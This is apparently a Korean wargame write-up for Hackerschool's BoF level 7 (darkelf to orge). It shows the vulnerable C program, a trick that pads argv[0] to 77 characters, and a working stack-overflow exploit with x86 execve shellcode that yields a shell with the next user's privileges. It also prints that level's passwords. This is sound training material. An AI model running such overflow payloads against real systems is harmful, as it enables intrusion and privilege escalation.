---
layout: post
title: "[Wargame] 해커스쿨 BoF LEVEL7 (darkelf -> orge) : check argv[0]"
date: 2015-11-08 16:30
comments: true
categories:  wargame
tags: [bof]
---

- id = darkelf 
- pw = kernel crashed 

<!--more-->

## orge.c

이번 문제는 `argv[0]`인 실행 명령어가 `77` 자가 되어야 한다.  실행 명령어는 `orge` 이기 때문에 이를 `77`가 되도록 해야한다.

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - orge
        - check argv[0]
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
        char buffer[40];
        int i;

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        // here is changed!
        if(strlen(argv[0]) != 77){
                printf("argv[0] error\n");
                exit(0);
        }

        // egghunter
        for(i=0; environ[i]; i++)
                memset(environ[i], 0, strlen(environ[i]));

        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }

        // check the length of argument
        if(strlen(argv[1]) > 48){
                printf("argument is too long!\n");
                exit(0);
        }


        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);
}              
```

실행 명령어를 77자로 만들기 위하여  상대 경로를 이용하여 `./dir/../` 형식으로 글자수를 맞추면 되지 않을까 ?

```bash
> mkdir `python -c 'print "A"*67'` 
> ./AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../orge AAAA
stack is still your friend. 
```

그런데, 이상한 것은 직접 실행을 할때에는 명령어 길이 조건 체크를 넘어갔는데, gdb 붙여서 디버깅을 하면 자꾸 너무 길게 나오는 것이다.  좀더 자세하게 보니깐 gdb 에서 상대경로로 실행을 하였으나 절대경로로 입력이 되어 아래와 같이 path 가 잡혀서 77자를 넘어가는 것이었다.

그래서 항상 **변하지 않도록 절대 path 를 사용해서 77자가 되도록 한 후** gdb 로 디버깅을 해보자.

## Exploit

버퍼 사이즈가 40bytes 인데 마지막에 버퍼를 0으로 set 하기 때문에 실제 shellcode 는 argv[2]에서 세팅을 하고, argv[1]에서는 shellcode 를 가르키도록 `LR`을 설정하여 공격하자.

```bash
   [BUFFER 40bytes][SFP][LR]
= [A 44bytes][LR]  [NOP][ShellCode]

$ /home/darkelf/CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC/../orge  `python -c 'print "A"*44 + "\x94\xfb\xff\xbf"'`  `python -c 'print "\x90"*150 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"'`
```

![img](https://raw.githubusercontent.com/humb1ec0ding/humb1ec0ding-etc/master/2015/11/stage7.png)

```bash
$ /home/darkelf/CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC/../orge  `python -c 'print "A"*44 + "\x94\xfb\xff\xbf"'`  `python -c 'print "\x90"*150 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
                                             bash: /home/darkelf/.bashrc: Permission denied
bash$ id
uid=506(darkelf) gid=506(darkelf) euid=507(orge) egid=507(orge) groups=506(darkelf)
```

## Next stage

```bash
> bash$ my-pass
euid = 507
timewalker
```